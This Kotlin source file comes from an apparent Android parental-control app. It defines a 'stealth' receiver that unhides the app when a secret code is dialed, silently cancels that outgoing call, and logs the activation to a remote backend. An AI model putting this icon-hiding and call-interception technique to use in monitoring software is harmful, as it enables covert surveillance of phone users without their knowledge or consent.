package com.example.parentalcontrol

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log

/**
 * SecretCodeReceiver v29 (Total Stealth Edition)
 *
 * This receiver is the primary door for opening the app once hidden.
 * It handles:
 *  1. android.provider.Telephony.SECRET_CODE (standard broadcast)
 *  2. android.intent.action.NEW_OUTGOING_CALL (interception fallback)
 */
class SecretCodeReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "SecretCodeReceiver"
        private const val SECRET_HOST = "1356365508"
    }

    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action ?: return
        Log.i(TAG, "onReceive action=$action data=${intent.data}")

        when (action) {
            // ── Standard SECRET_CODE broadcast ──
            "android.provider.Telephony.SECRET_CODE" -> {
                val host = intent.data?.host ?: ""
                if (host == SECRET_HOST) {
                    Log.i(TAG, "✅ SECRET_CODE matched $SECRET_HOST")
                    handleActivation(context)
                }
            }

            // ── NEW_OUTGOING_CALL fallback ──
            // If the user dials the code and it tries to place a real call, 
            // we intercept it here, abort the call, and open the app.
            Intent.ACTION_NEW_OUTGOING_CALL -> {
                val raw = resultData 
                    ?: intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER)
                    ?: return

                val digits = raw.replace(Regex("[^0-9]"), "")
                if (digits == SECRET_HOST) {
                    Log.i(TAG, "✅ NEW_OUTGOING_CALL matched $SECRET_HOST — Aborting call and opening app")
                    setResultData(null) // Cancel the call immediately
                    handleActivation(context)
                }
            }
        }
    }

    private fun handleActivation(context: Context) {
        try {
            // Log to remote for debugging (Run in background as it's a suspend function)
            kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
                try {
                    SupabaseManager.getInstance().logRemote(context, TAG, "INFO", "Secret Code Activation triggered")
                } catch (e: Exception) {
                    Log.e(TAG, "Remote log failed: ${e.message}")
                }
            }
            
            // Toggle visibility (Show icon + Launch)
            StealthManager.toggleStealthMode(context)
            
            Log.i(TAG, "Stealth toggle triggered successfully")
        } catch (e: Exception) {
            Log.e(TAG, "handleActivation failed: ${e.message}")
        }
    }
}
